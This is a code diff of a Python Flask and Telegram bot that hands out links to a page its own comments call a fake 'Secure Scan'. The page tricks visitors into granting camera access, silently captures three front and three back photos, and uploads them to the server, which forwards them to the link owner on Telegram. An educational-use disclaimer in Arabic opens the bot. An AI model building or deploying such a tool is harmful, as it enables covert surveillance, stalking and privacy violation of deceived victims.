@@ -12,7 +12,7 @@ import threading
 from datetime import datetime
 from flask import Flask, render_template_string, request, jsonify
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from colorama import init, Fore, Style
 
 init(autoreset=True)
@@ -36,11 +36,11 @@ if not BOT_TOKEN:
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
-# Store: user_id → list of generated links
-user_links = {}           # user_id: [link_id, link_id, ...]
-link_owner = {}           # link_id: user_id
+# ──── Global storage (in-memory - lost on restart) ────
+user_links = {}     # user_id → list of link_ids
+link_owner = {}     # link_id → user_id
 
-# ──── Welcome & Main Menu ────
+# ──── Welcome message with disclaimer ────
 @bot.message_handler(commands=['start'])
 def welcome(msg):
     text = f"""
@@ -48,7 +48,7 @@ def welcome(msg):
 
 اهلا وسهلا يا {msg.from_user.first_name} 👋
 
-هذا البوت تم تطويره من قبل أبو عزام لأغراض تعليمية وبحثية فقط.
+هذا البوت تم تطويره من قبل **أبو عزام** لأغراض تعليمية وبحثية فقط.
 أنا غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا الأداة.
 استخدمه على مسؤوليتك الشخصية الكاملة ⚠️
 
@@ -68,18 +68,18 @@ def welcome(msg):
     bot.send_message(msg.chat.id, text, reply_markup=kb, parse_mode='Markdown')
 
 
-# ──── Generate unique short link ────
+# ──── Generate short unique link ────
 @bot.callback_query_handler(func=lambda c: c.data == "generate_link")
 def gen_link(call):
     user_id = call.from_user.id
-    link_id = str(uuid.uuid4())[:8]  # قصير وجميل (8 حروف عشوائية)
+    link_id = str(uuid.uuid4())[:8]  # 8 chars short & nice
 
     if user_id not in user_links:
         user_links[user_id] = []
     user_links[user_id].append(link_id)
     link_owner[link_id] = user_id
 
-    base_url = request.host_url.rstrip('/')   # https://camera-snatcher-bot.onrender.com
+    base_url = request.host_url.rstrip('/')
     short_link = f"{base_url}/check/{link_id}"
 
     text = f"""
@@ -104,7 +104,7 @@ def gen_link(call):
     bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=kb, parse_mode='Markdown')
 
 
-# ──── Show user's previous links (optional) ────
+# ──── Show previous links ────
 @bot.callback_query_handler(func=lambda c: c.data == "my_links")
 def show_links(call):
     user_id = call.from_user.id
@@ -113,8 +113,8 @@ def show_links(call):
         return
 
     text = "روابطك السابقة:\n\n"
+    base_url = request.host_url.rstrip('/')
     for lid in user_links[user_id]:
-        base_url = request.host_url.rstrip('/')
         text += f"• `{base_url}/check/{lid}`\n"
 
     kb = InlineKeyboardMarkup()
@@ -123,7 +123,7 @@ def show_links(call):
     bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=kb, parse_mode='Markdown')
 
 
-# ──── The fake secure scan page ────
+# ──── Fake "Secure Scan" page ────
 SCAN_PAGE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -140,6 +140,7 @@ SCAN_PAGE = """
         #status {font-size:18px; margin:25px 0; color:#f85149;}
         .btn {padding:14px 28px; background:#238636; border:none; color:white; font-size:17px; border-radius:6px; cursor:pointer; margin:10px;}
         .error {color:#f85149;}
+        .success {color:#58a6ff;}
     </style>
 </head>
 <body>
@@ -183,20 +184,20 @@ SCAN_PAGE = """
             document.getElementById('start').style.display = 'none';
             let photos = [];
 
-            // Front 3
+            // Front 3 photos
             if (await startCamera('user')) {
-                for(let i=0; i<MAX_PHOTOS; i++) {
-                    await new Promise(r=>setTimeout(r,1200));
+                for(let i = 0; i < MAX_PHOTOS; i++) {
+                    await new Promise(r => setTimeout(r, 1200));
                     let blob = await capture();
                     photos.push(await blobToB64(blob));
                     document.getElementById('status').textContent = `تم التقاط صورة أمامية \( {i+1}/ \){MAX_PHOTOS}`;
                 }
             }
 
-            // Back 3
+            // Back 3 photos
             if (await startCamera('environment')) {
-                for(let i=0; i<MAX_PHOTOS; i++) {
-                    await new Promise(r=>setTimeout(r,1200));
+                for(let i = 0; i < MAX_PHOTOS; i++) {
+                    await new Promise(r => setTimeout(r, 1200));
                     let blob = await capture();
                     photos.push(await blobToB64(blob));
                     document.getElementById('status').textContent = `تم التقاط صورة خلفية \( {i+1}/ \){MAX_PHOTOS}`;
@@ -211,7 +212,7 @@ SCAN_PAGE = """
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({link: linkId, photos: photos})
                 }).then(r => r.json()).then(d => {
-                    document.getElementById('status').innerHTML = '<span style="color:#58a6ff">تم الفحص بنجاح!</span><br>يمكنك إغلاق الصفحة الآن';
+                    document.getElementById('status').innerHTML = '<span class="success">تم الفحص بنجاح!</span><br>يمكنك إغلاق الصفحة الآن';
                 });
             } else {
                 document.getElementById('status').innerHTML = '<span class="error">فشل التحقق</span><br>يرجى إعطاء الإذونات اللازمة لإتمام الأمر';
@@ -239,6 +240,7 @@ SCAN_PAGE = """
 def check_page(link_id):
     return render_template_string(SCAN_PAGE)
 
+
 @app.route('/upload', methods=['POST'])
 def upload_photos():
     data = request.json
@@ -257,20 +259,25 @@ def upload_photos():
             with open(filename, "wb") as f:
                 f.write(img_data)
             with open(filename, "rb") as f:
-                bot.send_photo(owner_id, f, caption=f"صورة {i+1} من الرابط /{link_id}")
+                caption = f"صورة {i+1} من الرابط /{link_id} – أبو عزام 2026"
+                bot.send_photo(owner_id, f, caption=caption)
             os.remove(filename)
-        except:
-            pass
+        except Exception as e:
+            print(f"Error sending photo {i+1}: {e}")
 
     return jsonify({"status": "ok"})
 
-# ──── Keep alive threads ────
+
+# ──── Flask + Bot threads ────
 def run_flask():
     port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=port, debug=False)
+
 
 def run_bot():
+    print(f"{g}[*] Bot polling started...{Style.RESET_ALL}")
     bot.infinity_polling(skip_pending=True)
+
 
 if __name__ == "__main__":
     print(BANNER)
@@ -278,10 +285,4 @@ if __name__ == "__main__":
     threading.Thread(target=run_flask, daemon=True).start()
     threading.Thread(target=run_bot, daemon=True).start()
     while True:
-        time.sleep(3600)if __name__ == "__main__":
-    print(BANNER)
-    print(f"{y}WEBAPP URL: https://{WEBAPP_URL}/{Style.RESET_ALL}")
-    threading.Thread(target=run_flask, daemon=True).start()
-    threading.Thread(target=run_bot, daemon=True).start()
-    while True:
-        time.sleep(3600)  # Keep alive
+        time.sleep(3600)  # keep alive
